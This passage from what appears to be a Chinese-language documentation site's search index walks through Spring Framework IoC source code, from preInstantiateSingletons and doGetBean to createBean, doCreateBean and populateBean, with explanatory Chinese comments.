    boolean isEagerInit;\n                    if (System.getSecurityManager() != null &amp;&amp; factory instanceof SmartFactoryBean) {\n                        isEagerInit = AccessController.doPrivileged((PrivilegedAction&lt;Boolean&gt;)\n                                        ((SmartFactoryBean&lt;?&gt;) factory)::isEagerInit,\n                                getAccessControlContext());\n                    }\n                    else {\n                        isEagerInit = (factory instanceof SmartFactoryBean &amp;&amp;\n                                ((SmartFactoryBean&lt;?&gt;) factory).isEagerInit());\n                    }\n                    if (isEagerInit) {\n                        // \u200b\u521b\u5efa\u200bbean\u200b\u5e76\u200b\u9012\u5f52\u200b\u6784\u5efa\u200bBean\u200b\u4e4b\u95f4\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\n                        getBean(beanName);\n                    }\n                }\n            }\n            else {\n                // \u200b\u521b\u5efa\u200bbean\u200b\u5e76\u200b\u9012\u5f52\u200b\u6784\u5efa\u200bBean\u200b\u4e4b\u95f4\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\n                getBean(beanName);\n            }\n        }\n    }\n\n    // Trigger post-initialization callback for all applicable beans...\n    for (String beanName : beanNames) {\n        Object singletonInstance = getSingleton(beanName);\n        if (singletonInstance instanceof SmartInitializingSingleton) {\n            final SmartInitializingSingleton smartSingleton = (SmartInitializingSingleton) singletonInstance;\n            if (System.getSecurityManager() != null) {\n                AccessController.doPrivileged((PrivilegedAction&lt;Object&gt;) () -&gt; {\n                    smartSingleton.afterSingletonsInstantiated();\n                    return null;\n                }, getAccessControlContext());\n            }\n            else {\n                smartSingleton.afterSingletonsInstantiated();\n            }\n        }\n    }\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#preinstantiatesingletonsgetbean","title":"preInstantiateSingletons()\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bgetBean\u200b\u65b9\u6cd5","text":"<ul> <li>getBean\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49\u200b\u5728\u200bBeanFactory\u200b\u63a5\u53e3\u200b\u4e2d\u200b</li> <li>getBean\u200b\u65b9\u6cd5\u200borg.springframework.beans.factory.support.AbstractBeanFactory\u200b\u4e2d\u200b\u5b9e\u73b0\u200b Java<pre><code>@Override\npublic Object getBean(String name) throws BeansException {\n    return doGetBean(name, null, null, false);\n}\n\n\n\n//\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e0a\u9762\u200b\u65b9\u6cd5\u200b\u8c03\u7528\u200bdoGetBean(name, null, null, false)\u200b\u65b9\u6cd5\u200b\n// \u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u7279\u522b\u200b\u957f\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u5b8c\u6574\u200b\u4ee3\u7801\u200b\uff1a\n@SuppressWarnings(\"unchecked\")\nprotected &lt;T&gt; T doGetBean(final String name, @Nullable final Class&lt;T&gt; requiredType,\n        @Nullable final Object[] args, boolean typeCheckOnly) throws BeansException {\n\n    final String beanName = transformedBeanName(name);\n    Object bean;\n\n    // Eagerly check singleton cache for manually registered singletons.\n    Object sharedInstance = getSingleton(beanName);\n    if (sharedInstance != null &amp;&amp; args == null) {\n        if (logger.isTraceEnabled()) {\n            if (isSingletonCurrentlyInCreation(beanName)) {\n                logger.trace(\"Returning eagerly cached instance of singleton bean '\" + beanName +\n                        \"' that is not fully initialized yet - a consequence of a circular reference\");\n            }\n            else {\n                logger.trace(\"Returning cached instance of singleton bean '\" + beanName + \"'\");\n            }\n        }\n        bean = getObjectForBeanInstance(sharedInstance, name, beanName, null);\n    }\n\n    else {\n        // Fail if we're already creating this bean instance:\n        // We're assumably within a circular reference.\n        if (isPrototypeCurrentlyInCreation(beanName)) {\n            throw new BeanCurrentlyInCreationException(beanName);\n        }\n\n        // Check if bean definition exists in this factory.\n        BeanFactory parentBeanFactory = getParentBeanFactory();\n        if (parentBeanFactory != null &amp;&amp; !containsBeanDefinition(beanName)) {\n            // Not found -&gt; check parent.\n            String nameToLookup = originalBeanName(name);\n            if (parentBeanFactory instanceof AbstractBeanFactory) {\n                return ((AbstractBeanFactory) parentBeanFactory).doGetBean(\n                        nameToLookup, requiredType, args, typeCheckOnly);\n            }\n            else if (args != null) {\n                // Delegation to parent with explicit args.\n                return (T) parentBeanFactory.getBean(nameToLookup, args);\n            }\n            else if (requiredType != null) {\n                // No args -&gt; delegate to standard getBean method.\n                return parentBeanFactory.getBean(nameToLookup, requiredType);\n            }\n            else {\n                return (T) parentBeanFactory.getBean(nameToLookup);\n            }\n        }\n\n        if (!typeCheckOnly) {\n            markBeanAsCreated(beanName);\n        }\n\n        try {\n            final RootBeanDefinition mbd = getMergedLocalBeanDefinition(beanName);\n            checkMergedBeanDefinition(mbd, beanName, args);\n\n            // Guarantee initialization of beans that the current bean depends on.\n            // \u200b\u83b7\u53d6\u200b\u5f53\u524d\u200bbean\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\n            String[] dependsOn = mbd.getDependsOn();\n            // \u200b\u6839\u636e\u200b\u4f9d\u8d56\u200b\u7684\u200bbeanName\u200b\u9012\u5f52\u200b\u8c03\u7528\u200bgetBean()\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u4e0d\u65ad\u200b\u63a2\u5bfb\u200b\u5176\u200b\u4f9d\u8d56\u200b\u7684\u200bbean\uff0c\u200b\u76f4\u5230\u200bgetSingleton\u200b\u65b9\u6cd5\u200b\u8fd4\u56de\u200b\u4f9d\u8d56\u200b\u7684\u200bBean\uff0c\u200b\u5373\u200b\u5f53\u524d\u200b\u6b63\u5728\u200b\u521b\u5efa\u200b\u7684\u200bBean\n            // \u200b\u76f4\u5230\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\u6700\u5e95\u5c42\u200b\u7684\u200bbean\u200b\u6ca1\u6709\u200b\u4f9d\u8d56\u200b\u5bf9\u8c61\u200b\u4e86\u200b\uff0c\u200b\u81f3\u6b64\u200b\u6574\u4e2a\u200b\u9012\u5f52\u200b\u8fc7\u7a0b\u200b\u7ed3\u675f\u200b  \n            if (dependsOn != null) {\n                for (String dep : dependsOn) {\n                    if (isDependent(beanName, dep)) {\n                        throw new BeanCreationException(mbd.getResourceDescription(), beanName,\n                                \"Circular depends-on relationship between '\" + beanName + \"' and '\" + dep + \"'\");\n                    }\n                    // \n                    registerDependentBean(dep, beanName);\n                    try {\n                        getBean(dep);\n                    }\n                    catch (NoSuchBeanDefinitionException ex) {\n                        throw new BeanCreationException(mbd.getResourceDescription(), beanName,\n                                \"'\" + beanName + \"' depends on missing bean '\" + dep + \"'\", ex);\n                    }\n                }\n            }\n            // Create bean instance.\n            if (mbd.isSingleton()) {\n                // getSingleton\u200b\u65b9\u6cd5\u200b\u7684\u200b\u53c2\u6570\u200b\u662f\u200bcreateBean(beanName, mbd, args)\u200b\u65b9\u6cd5\u200b\u7684\u200b\u8fd4\u56de\u503c\u200b\n                sharedInstance = getSingleton(beanName, () -&gt; {\n                    try {\n                        // createBean\u200b\u65b9\u6cd5\u200b\u5728\u200bAbstractBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u662f\u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\n                        return createBean(beanName, mbd, args);\n                    }\n                    catch (BeansException ex) {\n                        // Explicitly remove instance from singleton cache: It might have been put there\n                        // eagerly by the creation process, to allow for circular reference resolution.\n                        // Also remove any beans that received a temporary reference to the bean.\n                        destroySingleton(beanName);\n                        throw ex;\n                    }\n                });\n                bean = getObjectForBeanInstance(sharedInstance, name, beanName, mbd);\n            }\n\n            else if (mbd.isPrototype()) {\n                // It's a prototype -&gt; create a new instance.\n                Object prototypeInstance = null;\n                try {\n                    beforePrototypeCreation(beanName);\n                    prototypeInstance = createBean(beanName, mbd, args);\n                }\n                finally {\n                    afterPrototypeCreation(beanName);\n                }\n                bean = getObjectForBeanInstance(prototypeInstance, name, beanName, mbd);\n            }\n\n            else {\n                String scopeName = mbd.getScope();\n                final Scope scope = this.scopes.get(scopeName);\n                if (scope == null) {\n                    throw new IllegalStateException(\"No Scope registered for scope name '\" + scopeName + \"'\");\n                }\n                try {\n                    Object scopedInstance = scope.get(beanName, () -&gt; {\n                        beforePrototypeCreation(beanName);\n                        try {\n                            return createBean(beanName, mbd, args);\n                        }\n                        finally {\n                            afterPrototypeCreation(beanName);\n                        }\n                    });\n                    bean = getObjectForBeanInstance(scopedInstance, name, beanName, mbd);\n                }\n                catch (IllegalStateException ex) {\n                    throw new BeanCreationException(beanName,\n                            \"Scope '\" + scopeName + \"' is not active for the current thread; consider \" +\n                            \"defining a scoped proxy for this bean if you intend to refer to it from a singleton\",\n                            ex);\n                }\n            }\n        }\n        catch (BeansException ex) {\n            cleanupAfterBeanCreationFailure(beanName);\n            throw ex;\n        }\n    }\n\n    // Check if required type matches the type of the actual bean instance.\n    if (requiredType != null &amp;&amp; !requiredType.isInstance(bean)) {\n        try {\n            T convertedBean = getTypeConverter().convertIfNecessary(bean, requiredType);\n            if (convertedBean == null) {\n                throw new BeanNotOfRequiredTypeException(name, requiredType, bean.getClass());\n            }\n            return convertedBean;\n        }\n        catch (TypeMismatchException ex) {\n            if (logger.isTraceEnabled()) {\n                logger.trace(\"Failed to convert bean '\" + name + \"' to required type '\" +\n                        ClassUtils.getQualifiedName(requiredType) + \"'\", ex);\n            }\n            throw new BeanNotOfRequiredTypeException(name, requiredType, bean.getClass());\n        }\n    }\n    return (T) bean;\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#abstractautowirecapablebeanfactorycreatebeanstring-beanname-rootbeandefinition-mbd-nullable-object-args","title":"AbstractAutowireCapableBeanFactory\u200b\u7c7b\u4e2d\u200b\u7684\u200bcreateBean(String beanName, RootBeanDefinition mbd, @Nullable Object[] args)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory Java<pre><code>@Override\nprotected Object createBean(String beanName, RootBeanDefinition mbd, @Nullable Object[] args)\n        throws BeanCreationException {\n\n    if (logger.isTraceEnabled()) {\n        logger.trace(\"Creating instance of bean '\" + beanName + \"'\");\n    }\n    RootBeanDefinition mbdToUse = mbd;\n\n    // Make sure bean class is actually resolved at this point, and\n    // clone the bean definition in case of a dynamically resolved Class\n    // which cannot be stored in the shared merged bean definition.\n    Class&lt;?&gt; resolvedClass = resolveBeanClass(mbd, beanName);\n    if (resolvedClass != null &amp;&amp; !mbd.hasBeanClass() &amp;&amp; mbd.getBeanClassName() != null) {\n        mbdToUse = new RootBeanDefinition(mbd);\n        mbdToUse.setBeanClass(resolvedClass);\n    }\n\n    // Prepare method overrides.\n    try {\n        mbdToUse.prepareMethodOverrides();\n    }\n    catch (BeanDefinitionValidationException ex) {\n        throw new BeanDefinitionStoreException(mbdToUse.getResourceDescription(),\n                beanName, \"Validation of method overrides failed\", ex);\n    }\n\n    try {\n        // Give BeanPostProcessors a chance to return a proxy instead of the target bean instance.\n        Object bean = resolveBeforeInstantiation(beanName, mbdToUse);\n        if (bean != null) {\n            return bean;\n        }\n    }\n    catch (Throwable ex) {\n        throw new BeanCreationException(mbdToUse.getResourceDescription(), beanName,\n                \"BeanPostProcessor before instantiation of bean failed\", ex);\n    }\n\n    try {\n        // createBean\u200b\u65b9\u6cd5\u200b\u7684\u200b\u6838\u5fc3\u200b  \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u4f1a\u200b\u8fd4\u56de\u200bBean\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b9e\u4f8b\u200b\uff0c\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u9762\u200b\u8d34\u200b\u51fa\u200b\n        Object beanInstance = doCreateBean(beanName, mbdToUse, args);\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Finished creating instance of bean '\" + beanName + \"'\");\n        }\n        return beanInstance;\n    }\n    catch (BeanCreationException | ImplicitlyAppearedSingletonException ex) {\n        // A previously detected exception with proper bean creation context already,\n        // or illegal singleton state to be communicated up to DefaultSingletonBeanRegistry.\n        throw ex;\n    }\n    catch (Throwable ex) {\n        throw new BeanCreationException(\n                mbdToUse.getResourceDescription(), beanName, \"Unexpected exception during bean creation\", ex);\n    }\n}\n\n\n\n// \u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200bcreateBean\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bdoCreateBean(beanName, mbdToUse, args)\u200b\u65b9\u6cd5\u200b\nprotected Object doCreateBean(final String beanName, final RootBeanDefinition mbd, final @Nullable Object[] args)\n        throws BeanCreationException {\n\n    // Instantiate the bean.\n    BeanWrapper instanceWrapper = null;\n    if (mbd.isSingleton()) {\n        instanceWrapper = this.factoryBeanInstanceCache.remove(beanName);\n    }\n    if (instanceWrapper == null) {\n        // \u200b\u521b\u5efa\u200bBean\u200b\u5b9e\u4f8b\u200b\n        instanceWrapper = createBeanInstance(beanName, mbd, args);\n    }\n    final Object bean = instanceWrapper.getWrappedInstance();\n    Class&lt;?&gt; beanType = instanceWrapper.getWrappedClass();\n    if (beanType != NullBean.class) {\n        mbd.resolvedTargetType = beanType;\n    }\n\n    // Allow post-processors to modify the merged bean definition.\n    synchronized (mbd.postProcessingLock) {\n        if (!mbd.postProcessed) {\n            try {\n                applyMergedBeanDefinitionPostProcessors(mbd, beanType, beanName);\n            }\n            catch (Throwable ex) {\n                throw new BeanCreationException(mbd.getResourceDescription(), beanName,\n                        \"Post-processing of merged bean definition failed\", ex);\n            }\n            mbd.postProcessed = true;\n        }\n    }\n\n    // Eagerly cache singletons to be able to resolve circular references\n    // even when triggered by lifecycle interfaces like BeanFactoryAware.\n    boolean earlySingletonExposure = (mbd.isSingleton() &amp;&amp; this.allowCircularReferences &amp;&amp;\n            isSingletonCurrentlyInCreation(beanName));\n    if (earlySingletonExposure) {\n        if (logger.isTraceEnabled()) {\n            logger.trace(\"Eagerly caching bean '\" + beanName +\n                    \"' to allow for resolving potential circular references\");\n        }\n        addSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));\n    }\n\n    // Initialize the bean instance.\n    Object exposedObject = bean;\n    try {\n        // \u200b\u586b\u5145\u200bbean\uff0c\u200b\u5b9e\u9645\u200b\u8fdb\u884c\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u7684\u200b\u5730\u65b9\u200b\n        populateBean(beanName, mbd, instanceWrapper);\n        exposedObject = initializeBean(beanName, exposedObject, mbd);\n    }\n    catch (Throwable ex) {\n        if (ex instanceof BeanCreationException &amp;&amp; beanName.equals(((BeanCreationException) ex).getBeanName())) {\n            throw (BeanCreationException) ex;\n        }\n        else {\n            throw new BeanCreationException(\n                    mbd.getResourceDescription(), beanName, \"Initialization of bean failed\", ex);\n        }\n    }\n\n    if (earlySingletonExposure) {\n        Object earlySingletonReference = getSingleton(beanName, false);\n        if (earlySingletonReference != null) {\n            if (exposedObject == bean) {\n                exposedObject = earlySingletonReference;\n            }\n            else if (!this.allowRawInjectionDespiteWrapping &amp;&amp; hasDependentBean(beanName)) {\n                String[] dependentBeans = getDependentBeans(beanName);\n                Set&lt;String&gt; actualDependentBeans = new LinkedHashSet&lt;&gt;(dependentBeans.length);\n                for (String dependentBean : dependentBeans) {\n                    if (!removeSingletonIfCreatedForTypeCheckOnly(dependentBean)) {\n                        actualDependentBeans.add(dependentBean);\n                    }\n                }\n                if (!actualDependentBeans.isEmpty()) {\n                    throw new BeanCurrentlyInCreationException(beanName,\n                            \"Bean with name '\" + beanName + \"' has been injected into other beans [\" +\n                            StringUtils.collectionToCommaDelimitedString(actualDependentBeans) +\n                            \"] in its raw version as part of a circular reference, but has eventually been \" +\n                            \"wrapped. This means that said other beans do not use the final version of the \" +\n                            \"bean. This is often the result of over-eager type matching - consider using \" +\n                            \"'getBeanNamesOfType' with the 'allowEagerInit' flag turned off, for example.\");\n                }\n            }\n        }\n    }\n\n    // Register bean as disposable.\n    try {\n        registerDisposableBeanIfNecessary(beanName, bean, mbd);\n    }\n    catch (BeanDefinitionValidationException ex) {\n        throw new BeanCreationException(\n                mbd.getResourceDescription(), beanName, \"Invalid destruction signature\", ex);\n    }\n\n    return exposedObject;\n}\n\n\n// \u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200bdoCreateBean\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200b createBeanInstance(beanName, mbd, args)\u200b\u65b9\u6cd5\u200b\nprotected BeanWrapper createBeanInstance(String beanName, RootBeanDefinition mbd, @Nullable Object[] args) {\n    // Make sure bean class is actually resolved at this point.\n    Class&lt;?&gt; beanClass = resolveBeanClass(mbd, beanName);\n\n    if (beanClass != null &amp;&amp; !Modifier.isPublic(beanClass.getModifiers()) &amp;&amp; !mbd.isNonPublicAccessAllowed()) {\n        throw new BeanCreationException(mbd.getResourceDescription(), beanName,\n                \"Bean class isn't public, and non-public access not allowed: \" + beanClass.getName());\n    }\n\n    Supplier&lt;?&gt; instanceSupplier = mbd.getInstanceSupplier();\n    if (instanceSupplier != null) {\n        return obtainFromSupplier(instanceSupplier, beanName);\n    }\n\n    if (mbd.getFactoryMethodName() != null) {\n        return instantiateUsingFactoryMethod(beanName, mbd, args);\n    }\n\n    // Shortcut when re-creating the same bean...\n    boolean resolved = false;\n    boolean autowireNecessary = false;\n    if (args == null) {\n        synchronized (mbd.constructorArgumentLock) {\n            if (mbd.resolvedConstructorOrFactoryMethod != null) {\n                resolved = true;\n                autowireNecessary = mbd.constructorArgumentsResolved;\n            }\n        }\n    }\n    if (resolved) {\n        if (autowireNecessary) {\n            return autowireConstructor(beanName, mbd, null, null);\n        }\n        else {\n            // \u200b\u8c03\u7528\u200binstantiateBean\u200b\u65b9\u6cd5\u200b\n            return instantiateBean(beanName, mbd);\n        }\n    }\n\n    // Candidate constructors for autowiring?\n    Constructor&lt;?&gt;[] ctors = determineConstructorsFromBeanPostProcessors(beanClass, beanName);\n    if (ctors != null || mbd.getResolvedAutowireMode() == AUTOWIRE_CONSTRUCTOR ||\n            mbd.hasConstructorArgumentValues() || !ObjectUtils.isEmpty(args)) {\n        return autowireConstructor(beanName, mbd, ctors, args);\n    }\n\n    // Preferred constructors for default construction?\n    ctors = mbd.getPreferredConstructors();\n    if (ctors != null) {\n        return autowireConstructor(beanName, mbd, ctors, null);\n    }\n\n    // No special handling: simply use no-arg constructor.\n    return instantiateBean(beanName, mbd);\n}\n\n// \u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200bcreateBeanInstance\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200binstantiateBean(beanName, mbd)\u200b\u65b9\u6cd5\u200b\nprotected BeanWrapper instantiateBean(final String beanName, final RootBeanDefinition mbd) {\n    try {\n        Object beanInstance;\n        final BeanFactory parent = this;\n        if (System.getSecurityManager() != null) {\n            // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n            beanInstance = AccessController.doPrivileged((PrivilegedAction&lt;Object&gt;) () -&gt;\n                    getInstantiationStrategy().instantiate(mbd, beanName, parent),\n                    getAccessControlContext());\n        }\n        else {\n            // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n            beanInstance = getInstantiationStrategy().instantiate(mbd, beanName, parent);\n        }\n        BeanWrapper bw = new BeanWrapperImpl(beanInstance);\n        initBeanWrapper(bw);\n        return bw;\n    }\n    catch (Throwable ex) {\n        throw new BeanCreationException(\n                mbd.getResourceDescription(), beanName, \"Instantiation of bean failed\", ex);\n    }\n}\n\n// \u200b\u4e0a\u9762\u200b\u7684\u200bgetInstantiationStrategy()\u200b\u65b9\u6cd5\u200b\u4ee3\u7801\u200b\nprotected InstantiationStrategy getInstantiationStrategy() {\n    return this.instantiationStrategy;\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#getinstantiationstrategysimpleinstantiationstrategy","title":"getInstantiationStrategy()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u8fd4\u56de\u200b\u63a5\u53e3\u200b\u5bf9\u8c61\u200b\u7684\u200b\u7b56\u7565\u200b\u5bf9\u8c61\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b9e\u73b0\u200bSimpleInstantiationStrategy","text":"<ul> <li>org.springframework.beans.factory.support.SimpleInstantiationStrategy</li> <li>SimpleInstantiationStrategy.instantiate(RootBeanDefinition bd, @Nullable String beanName, BeanFactory owner)\u200b\u65b9\u6cd5\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\uff1a Java<pre><code>@Override\npublic Object instantiate(RootBeanDefinition bd, @Nullable String beanName, BeanFactory owner) {\n    // Don't override the class with CGLIB if no overrides.\n    if (!bd.hasMethodOverrides()) {\n        Constructor&lt;?&gt; constructorToUse;\n        synchronized (bd.constructorArgumentLock) {\n            constructorToUse = (Constructor&lt;?&gt;) bd.resolvedConstructorOrFactoryMethod;\n            if (constructorToUse == null) {\n                final Class&lt;?&gt; clazz = bd.getBeanClass();\n                if (clazz.isInterface()) {\n                    throw new BeanInstantiationException(clazz, \"Specified class is an interface\");\n                }\n                try {\n                    if (System.getSecurityManager() != null) {\n                        constructorToUse = AccessController.doPrivileged(\n                                (PrivilegedExceptionAction&lt;Constructor&lt;?&gt;&gt;) clazz::getDeclaredConstructor);\n                    }\n                    else {\n                        constructorToUse = clazz.getDeclaredConstructor();\n                    }\n                    bd.resolvedConstructorOrFactoryMethod = constructorToUse;\n                }\n                catch (Throwable ex) {\n                    throw new BeanInstantiationException(clazz, \"No default constructor found\", ex);\n                }\n            }\n        }\n        // \u200b\u8c03\u7528\u200b\u9759\u6001\u65b9\u6cd5\u200bBeanUtils.instantiateClass(constructorToUse);\n        return BeanUtils.instantiateClass(constructorToUse);\n    }\n    else {\n        // Must generate CGLIB subclass.\n        return instantiateWithMethodInjection(bd, beanName, owner);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#beanutilsinstantiateclassconstructortouse","title":"\u9759\u6001\u65b9\u6cd5\u200bBeanUtils.instantiateClass(constructorToUse)\u200b\u7684\u200b\u5b9e\u73b0\u200b\u7ec6\u8282","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.BeanUtils Java<pre><code>public static &lt;T&gt; T instantiateClass(Constructor&lt;T&gt; ctor, Object... args) throws BeanInstantiationException {\n    Assert.notNull(ctor, \"Constructor must not be null\");\n    try {\n        ReflectionUtils.makeAccessible(ctor);\n        // \u200b\u5224\u65ad\u200b\u662f\u5426\u662f\u200bKotlin\u200b\u7c7b\u578b\u200b\n        if (KotlinDetector.isKotlinReflectPresent() &amp;&amp; KotlinDetector.isKotlinType(ctor.getDeclaringClass())) {\n            // \u200b\u662f\u200bKotlin\u200b\u7c7b\u578b\u200b\n            return KotlinDelegate.instantiateClass(ctor, args);\n        }\n        else {\n            // \u200b\u4e0d\u662f\u200bKotlin\u200b\u7c7b\u578b\u200b\n            Class&lt;?&gt;[] parameterTypes = ctor.getParameterTypes();\n            Assert.isTrue(args.length &lt;= parameterTypes.length, \"Can't specify more arguments than constructor parameters\");\n            Object[] argsWithDefaultValues = new Object[args.length];\n            for (int i = 0 ; i &lt; args.length; i++) {\n                if (args[i] == null) {\n                    Class&lt;?&gt; parameterType = parameterTypes[i];\n                    argsWithDefaultValues[i] = (parameterType.isPrimitive() ? DEFAULT_TYPE_VALUES.get(parameterType) : null);\n                }\n                else {\n                    argsWithDefaultValues[i] = args[i];\n                }\n            }\n            // \u200b\u8c03\u7528\u200bConstructor\u200b\u7684\u200bnewInstance\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u4f7f\u7528\u200b\u53cd\u5c04\u200b\u521b\u5efa\u200b\u5b9e\u4f8b\u200b\n            // \u200b\u5230\u200b\u6b64\u200b\u4e4b\u540e\u200bbean\u200b\u5b9e\u4f8b\u200b\u521b\u5efa\u200b\u5b8c\u6210\u200b\n            return ctor.newInstance(argsWithDefaultValues);\n        }\n    }\n    catch (InstantiationException ex) {\n        throw new BeanInstantiationException(ctor, \"Is it an abstract class?\", ex);\n    }\n    catch (IllegalAccessException ex) {\n        throw new BeanInstantiationException(ctor, \"Is the constructor accessible?\", ex);\n    }\n    catch (IllegalArgumentException ex) {\n        throw new BeanInstantiationException(ctor, \"Illegal arguments for constructor\", ex);\n    }\n    catch (InvocationTargetException ex) {\n        throw new BeanInstantiationException(ctor, \"Constructor threw exception\", ex.getTargetException());\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#abstractautowirecapablebeanfactorydocreatebeanpopulatebeanbeanname-mbd-instancewrapper","title":"AbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u7684\u200b\u4e2d\u200bdoCreateBean\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bpopulateBean(beanName, mbd, instanceWrapper)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u5728\u200bAbstractAutowireCapableBeanFactory\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u7684\u200b\u65b9\u6cd5\u200bpopulateBean\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u8be5\u200b\u65b9\u6cd5\u200b\u7528\u4e8e\u200b\u586b\u5145\u200bbean \u200b\u5177\u4f53\u200b\u53d1\u751f\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u7684\u200b\u5730\u65b9\u200b Java<pre><code>@SuppressWarnings(\"deprecation\")  // for postProcessPropertyValues\nprotected void populateBean(String beanName, RootBeanDefinition mbd, @Nullable BeanWrapper bw) {\n    if (bw == null) {\n        if (mbd.hasPropertyValues()) {\n            throw new BeanCreationException(\n                    mbd.getResourceDescription(), beanName, \"Cannot apply property values to null instance\");\n        }\n        else {\n            // Skip property population phase for null instance.\n            return;\n        }\n    }\n\n    // Give any InstantiationAwareBeanPostProcessors the opportunity to modify the\n    // state of the bean before properties are set. This can be used, for example,\n    // to support styles of field injection.\n    boolean continueWithPropertyPopulation = true;\n\n    if (!mbd.isSynthetic() &amp;&amp; hasInstantiationAwareBeanPostProcessors()) {\n        for (BeanPostProcessor bp : getBeanPostProcessors()) {\n            if (bp instanceof InstantiationAwareBeanPostProcessor) {\n                InstantiationAwareBeanPostProcessor ibp = (InstantiationAwareBeanPostProcessor) bp;\n                if (!ibp.postProcessAfterInstantiation(bw.getWrappedInstance(), beanName)) {\n                    continueWithPropertyPopulation = false;\n                    break;\n                }\n            }\n        }\n    }\n\n    if (!continueWithPropertyPopulation) {\n        return;\n    }\n    // \u200b\u83b7\u53d6\u200bbean\u200b\u7684\u200b\u6240\u6709\u200b\u5c5e\u6027\u200b \u200b\u7528\u4e8e\u200b\u540e\u9762\u200b\u914d\u7f6e\u200bProperty\u200b\u5143\u7d20\u200b \u200b\u5373\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\n    PropertyValues pvs = (mbd.hasPropertyValues() ? mbd.getPropertyValues() : null);\n\n    int resolvedAutowireMode = mbd.getResolvedAutowireMode();\n    if (resolvedAutowireMode == AUTOWIRE_BY_NAME || resolvedAutowireMode == AUTOWIRE_BY_TYPE) {\n        MutablePropertyValues newPvs = new MutablePropertyValues(pvs);\n        // Add property values based on autowire by name if applicable.\n        if (resolvedAutowireMode == AUTOWIRE_BY_NAME) {\n            autowireByName(beanName, mbd, bw, newPvs);\n        }\n        // Add property values based on autowire by type if applicable.\n        if (resolvedAutowireMode == AUTOWIRE_BY_TYPE) {\n            autowireByType(beanName, mbd, bw, newPvs);\n        }\n        pvs = newPvs;\n    }\n\n    boolean hasInstAwareBpps = hasInstantiationAwareBeanPostProcessors();\n    boolean needsDepCheck = (mbd.getDependencyCheck() != AbstractBeanDefinition.DEPENDENCY_CHECK_NONE);\n\n    PropertyDescriptor[] filteredPds = null;\n    if (hasInstAwareBpps) {\n        if (pvs == null) {\n            pvs = mbd.getPropertyValues();\n        }\n        for (BeanPostProcessor bp : getBeanPostProcessors()) {\n            if (bp instanceof InstantiationAwareBeanPostProcessor) {\n                InstantiationAwareBeanPostProcessor ibp = (InstantiationAwareBeanPostProcessor) bp;\n                PropertyValues pvsToUse = ibp.postProcessProperties(pvs, bw.getWrappedInstance(), beanName);\n                if (pvsToUse == null) {\n                    if (filteredPds == null) {\n                        filteredPds = filterPropertyDescriptorsForDependencyCheck(bw, mbd.allowCaching);\n                    }\n                    pvsToUse = ibp.postProcessPropertyValues(pvs, filteredPds, bw.getWrappedInstance(), beanName);\n                    if (pvsToUse == null) {\n                        return;\n                    }\n                }\n                pvs = pvsToUse;\n            }\n        }\n    }\n    if (needsDepCheck) {\n        if (filteredPds == null) {\n            filteredPds = filterPropertyDescriptorsForDependencyCheck(bw, mbd.allowCaching);\n        }\n        checkDependencies(beanName, mbd, filteredPds, pvs);\n    }\n\n    if (pvs != null) {\n        // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b 